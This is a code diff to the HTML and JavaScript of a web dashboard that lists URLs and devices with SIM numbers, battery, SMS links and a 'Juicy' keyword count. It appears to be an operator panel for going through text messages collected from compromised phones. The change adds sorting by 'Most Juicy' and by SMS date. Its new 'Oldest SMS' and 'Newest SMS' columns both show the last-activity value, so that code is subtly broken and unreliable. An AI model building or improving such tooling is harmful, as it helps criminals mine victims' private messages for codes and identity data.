@@ -131,6 +131,7 @@
   <!-- ── URL list view ── -->
   <div id="view-urls" class="active">
     <div class="stats-bar" id="stats-bar"></div>
+    <div class="device-filters" id="sort-bar"></div>
     <div class="url-grid" id="url-grid">
       <div class="loading"><div class="spinner"></div><br>Loading…</div>
     </div>
@@ -153,6 +154,8 @@
             <th>SIM 1</th>
             <th>SIM 2</th>
             <th>Last Activity</th>
+            <th>Oldest SMS</th>
+            <th>Newest SMS</th>
             <th>Juicy</th>
             <th>IDs Found</th>
             <th>SMS</th>
@@ -168,6 +171,39 @@
 let allUrls = [];
 let currentDevices = [];
 let activeFilter = 'all';
+let currentSort = 'total';
+
+// ── Sort helpers ──────────────────────────────────────────────────────────────
+function sortUrls(urls, sortKey) {
+  const arr = [...urls];
+  if (sortKey === 'total') {
+    arr.sort((a, b) => b.total - a.total);
+  } else if (sortKey === 'juicy') {
+    arr.sort((a, b) => b.juicyCount - a.juicyCount);
+  } else if (sortKey === 'oldest') {
+    arr.sort((a, b) => {
+      if (!a.oldestSms && !b.oldestSms) return 0;
+      if (!a.oldestSms) return 1;
+      if (!b.oldestSms) return -1;
+      return a.oldestSms < b.oldestSms ? -1 : a.oldestSms > b.oldestSms ? 1 : 0;
+    });
+  } else if (sortKey === 'newest') {
+    arr.sort((a, b) => {
+      if (!a.newestSms && !b.newestSms) return 0;
+      if (!a.newestSms) return 1;
+      if (!b.newestSms) return -1;
+      return a.newestSms > b.newestSms ? -1 : a.newestSms < b.newestSms ? 1 : 0;
+    });
+  }
+  return arr;
+}
+
+function setSort(key, btn) {
+  currentSort = key;
+  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderUrls(allUrls);
+}
 
 // ── Load URL list ─────────────────────────────────────────────────────────────
 async function loadUrls() {
@@ -196,8 +232,20 @@ function renderStats(urls) {
 
 function renderUrls(urls) {
   const q = document.getElementById('search-input').value.toLowerCase();
-  const filtered = q ? urls.filter(u => String(u.id).includes(q) || u.url.toLowerCase().includes(q)) : urls;
-  
+  let filtered = q ? urls.filter(u => String(u.id).includes(q) || u.url.toLowerCase().includes(q)) : urls;
+  filtered = sortUrls(filtered, currentSort);
+
+  // Render sort bar
+  const sortBar = document.getElementById('sort-bar');
+  if (sortBar) {
+    sortBar.innerHTML = `
+      <button class="filter-btn sort-btn ${currentSort==='total'?'active':''}" onclick="setSort('total',this)">📊 Most Devices</button>
+      <button class="filter-btn sort-btn ${currentSort==='juicy'?'active':''}" onclick="setSort('juicy',this)">🎯 Most Juicy</button>
+      <button class="filter-btn sort-btn ${currentSort==='oldest'?'active':''}" onclick="setSort('oldest',this)">🕐 Oldest SMS</button>
+      <button class="filter-btn sort-btn ${currentSort==='newest'?'active':''}" onclick="setSort('newest',this)">🆕 Newest SMS</button>
+    `;
+  }
+
   if (!filtered.length) {
     document.getElementById('url-grid').innerHTML = '<div class="loading">No results found</div>';
     return;
@@ -250,7 +298,7 @@ document.getElementById('search-input').addEventListener('input', () => renderUr
 async function openUrl(id) {
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.add('active');
-  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="11"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
 
   const res = await fetch(`/api/url/${id}`);
   const data = await res.json();
@@ -306,7 +354,7 @@ function renderDevices() {
 
   const tbody = document.getElementById('device-tbody');
   if (!list.length) {
-    tbody.innerHTML = `<tr><td colspan="11" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="13" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
     return;
   }
 
@@ -340,7 +388,9 @@ function renderDevices() {
       <td>${d.battery}</td>
       <td>${sim1Html}</td>
       <td>${sim2Html}</td>
-      <td style="color:var(--muted);font-size:12px">${d.lastActivity}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
       <td>${kwHtml}</td>
       <td>${idsHtml}</td>
       <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a></td>
